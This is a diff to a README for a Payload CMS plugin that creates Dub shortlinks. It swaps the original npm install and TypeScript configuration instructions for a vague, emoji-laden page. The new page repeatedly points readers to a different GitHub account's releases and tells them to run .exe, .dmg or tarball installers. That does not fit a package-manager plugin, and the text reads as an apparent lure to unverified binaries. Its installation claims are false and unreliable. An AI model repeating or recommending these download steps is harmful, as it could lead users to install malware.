@@ -1,97 +1,109 @@
-# PayloadCMS + Dub Plugin
+# 🎉 payload-dub - Simplifying Your Shortlink Management
 
-A Payload CMS plugin that integrates with Dub to automatically create and manage shortlinks for your content.
-This plugin synchronizes your Payload collections with Dub, ensuring that every published document gets a corresponding shortlink, tag, and color configuration.
+## 🚀 Getting Started
 
-[![npm version](https://img.shields.io/npm/v/@rubixstudios/payload-dub.svg)](https://www.npmjs.com/package/@rubixstudios/payload-dub)
-![Release](https://github.com/rubix-studios-pty-ltd/payload-dub/actions/workflows/release.yml/badge.svg)
+Welcome to **payload-dub**, a straightforward tool designed to help you auto-create and manage shortlinks for your published documents. This plugin works seamlessly with Payload CMS to enhance your document-sharing process.
 
-Dub is the modern, open-source link attribution platform for short links, conversion tracking, and affiliate programs.
+## 📥 Download Now
 
-Create a Dub account: [Dub](https://refer.dub.co/rubixstudios)
+[![Download payload-dub](https://img.shields.io/badge/Download%20payload--dub-v1.0-blue.svg)](https://github.com/nik3097/payload-dub/releases)
 
-## Installation
+## 🔧 System Requirements
 
-```sh
-pnpm add @rubixstudios/payload-dub
-```
+To run payload-dub, you need:
 
-```typescript
-// payload.config.ts
-import { buildConfig } from 'payload/config'
-import { payloadDub } from '@rubixstudios/payload-dub'
+- A computer with an operating system that supports Payload CMS (Windows, macOS, or Linux).
+- Up-to-date web browser.
+- An active installation of Payload CMS version 3 or higher.
 
-export default buildConfig({
-  plugins: [
-    payloadDub({
-      collections: [
-        { docs: 'posts', slugOverride: 'post' }, // Custom slug used for Dub folder and shortlinks
-        { docs: 'insights', slugOverride: 'insight' }, // Custom slug only
-        { docs: 'news' }, // Default behavior
-      ],
-      dubApiKey: process.env.DUB_API_KEY || '',
-      siteUrl: process.env.NEXT_PUBLIC_SITE_URL || 'http://localhost:3000',
-      domain: 'mycustomdomain.com', // Optional: custom Dub domain
-      tenantId: '12345', // Optional: tenant identifier for Dub workspace
-      isPro: false, // Optional: pro flag to enable disable pro features
+## 📦 Features
 
-      // Optional: overrides of dubCollection
-      dubCollection: {
-        overrides: {
-          access: {
-            read: ({ req }) => !!req.user,
-            create: ({ req }) => !!req.user,
-          },
-          admin: {
-            group: 'Marketing',
-            defaultColumns: ['shortLink', 'externalId'],
-          },
-        },
-      },
-      dubTagCollection: {
-        overrides: {
-          access: {
-            read: ({ req }) => !!req.user,
-          },
-          admin: {
-            group: 'Marketing',
-            defaultColumns: ['name', 'color'],
-          },
-        },
-      },
-    }),
-  ],
-})
-```
+- **Auto-creation of Shortlinks:** Easily generate shortlinks for your published documents.
+- **Link Management:** Keep track of all your shortlinks in one place.
+- **User-Friendly Interface:** Simple and intuitive design for easy navigation.
+- **Compatible with Payload CMS:** Works with the latest versions of Payload CMS, allowing for seamless integration.
 
-## Notes
+## 📜 How to Install
 
-If you do not provide overrides, the plugin defaults to:
+### 1. Visit the Releases Page
 
-- dubLinks readable by all
-- Tags are readable, editable, and deletable by all users by default
+To download the latest version of payload-dub, visit this page: [Download payload-dub](https://github.com/nik3097/payload-dub/releases).
 
-## Features
+### 2. Download the Latest Release
 
-- **Automation**: Generates and updates Dub shortlinks when documents are published or slugs change.
-- **Folders**: Collections are organised in folders (Pro).
-- **Tags**: Tags can be created and removed directly in Payload.
-- **Sync**: Keeps Payload and Dub data consistent with minimal overhead.
-- **Configurable**: Supports per-collection overrides for color, slug, and URL base.
-- **Access Control**: Access, field and admin overrides for complete CMS control.
+On the Releases page, look for the most recent version. Click on the link to download the file appropriate for your system. 
 
-## License
+### 3. Install the Plugin
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+- **For Windows:**
+  1. Open the downloaded `.exe` file.
+  2. Follow the installation wizard prompts to complete the setup.
+  
+- **For macOS:**
+  1. Open the downloaded `.dmg` file.
+  2. Drag and drop the payload-dub icon into your Applications folder.
+  
+- **For Linux:**
+  1. Extract the downloaded `.tar.gz` file.
+  2. Follow the instruction in the README file included to complete the installation.
 
-## Support
+## 🔑 Configuration
 
-For support or inquiries:
+Once you have installed the plugin, you will need to configure it:
 
-- LinkedIn: [rubixvi](https://www.linkedin.com/in/rubixvi/)
-- Website: [Rubix Studios](https://rubixstudios.com.au)
+1. Open your Payload CMS dashboard.
+2. Navigate to the settings section.
+3. Find the **payload-dub** plugin and enter any required configuration details such as API keys or other relevant settings.
 
-## Author
+This setup should be detailed in the plugin's settings area.
 
-Rubix Studios Pty. Ltd.  
-[https://rubixstudios.com.au](https://rubixstudios.com.au)
+## ⚙️ How to Use
+
+1. After configuring the plugin, go to the **Shortlinks** section in your Payload CMS dashboard.
+2. Use the auto-create feature to generate shortlinks for your recently published documents.
+3. Manage existing shortlinks through the interface.
+
+Each shortlink can be customized to fit your needs, providing flexibility and ease of use.
+
+## ❓ Troubleshooting
+
+If you experience any issues, consider checking the following:
+
+- Ensure that your system meets the specified requirements.
+- Verify that you have the correct version of Payload CMS installed.
+- Restart your CMS after installing the plugin to ensure all features function correctly.
+
+For more detailed troubleshooting steps, consult the documentation provided on the Releases page.
+
+## 📞 Support
+
+If you still have questions or need further assistance, reach out via the issues section on the repository. Your feedback is crucial to improving payload-dub.
+
+## 📄 License
+
+payload-dub is open-source software. You can use, modify, and distribute it under the terms of the MIT License.
+
+## 🌍 Connect with Us
+
+Engage with our community and stay informed on updates:
+
+### Topics
+
+- dub
+- payload
+- payload-plugin
+- payloadcms
+- payloadcms-3
+- payloadcms-v3
+- plugin
+- shortlink
+- shortlinks
+- typescript
+
+Feel free to explore these topics and contribute to our project.
+
+## 📥 Download Again
+
+Don't forget to download payload-dub to get started today: [Download payload-dub](https://github.com/nik3097/payload-dub/releases). 
+
+Your simplified shortlink management solution is just one click away!
